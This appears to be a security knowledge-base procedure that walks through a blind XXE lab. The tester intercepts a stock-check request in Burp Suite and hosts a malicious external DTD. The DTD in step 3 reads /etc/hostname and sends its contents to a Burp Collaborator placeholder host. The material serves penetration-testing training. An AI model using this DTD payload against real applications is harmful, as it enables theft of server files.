---
id: 11492d1d-921e-47c7-9cee-ec84232e5ce2
name: Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD
type: procedure
verified: true
submitted: true
created_at: '2020-08-22T19:31:14.558089+00:00'
updated_at: '2023-05-26T01:32:48.208329+00:00'
platforms:
- Web
tags:
- '[[owasp]]'
- '[[owasp top 10]]'
- '[[Web Applications]]'
- '[[xxe]]'
---

# Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD

**Status**: âœ“ Verified

## Summary

The XML request can be modified by adding an external entity to perform XXE attacks. In blind XXE, malicious external DTD can be used to exfiltrate the data. 

## Description

# Description

The XML request can be modified by adding an external entity to perform XXE attacks. In blind XXE, malicious external DTD can be used to exfiltrate the data.



# Procedure



1. Visit the product page and click on check stock. Intercept the request in Burp Suite. Right-click and send the request to repeater





![33fd9151-364c-4431-84da-674e01204cf0.png]()



2. In the Burp Suit menu, launch Burp Collaborator client. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.





![1937f357-1256-441a-8e28-828a75116852.png]()



3. Click "Go to exploit server" and save the malicious DTD file on your server. Place the Burp Collaborator payload into a malicious DTD file:



*`<!ENTITY % file SYSTEM "file:///etc/hostname">`
 `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">`
 `%eval;`
 `*%exfil;`





![089fda0c-2f28-4438-9f95-a5f9e546b71b.png]()



4. Click "View exploit" and make a note of the URL.





![89e8fc9e-f0de-41fd-8959-2ab834f65d20.png]()



5. Add the external entity obtained in the previous step between the XML declaration  and the stockCheck element in the request that is sent to the Burp repeater in step 1.





![3108d4d9-ce66-46bb-8c49-f8e1ef6a6b01.png]()





6. Go to the Burp Collaborator client window, and click "Poll now". Some DNS and HTTP interactions can be observed, that were initiated by the application as the result of the payload. The HTTP interaction could contain the contents of the `/etc/hostname` file.





![29452c1f-26cb-43b1-bb52-61a6b18c6d70.png]()





## Platforms

- Web

## Tags

- [[owasp]]
- [[owasp top 10]]
- [[Web Applications]]
- [[xxe]]


